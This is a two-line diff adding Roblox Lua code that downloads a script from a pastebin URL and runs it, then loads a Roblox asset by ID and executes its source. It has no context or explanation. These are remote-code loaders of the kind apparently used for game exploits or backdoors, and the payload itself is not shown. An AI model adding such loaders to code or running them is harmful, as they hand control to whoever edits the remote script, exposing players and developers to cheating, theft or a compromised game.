@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/t7Dk8Ybb", true))() 
+
+loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
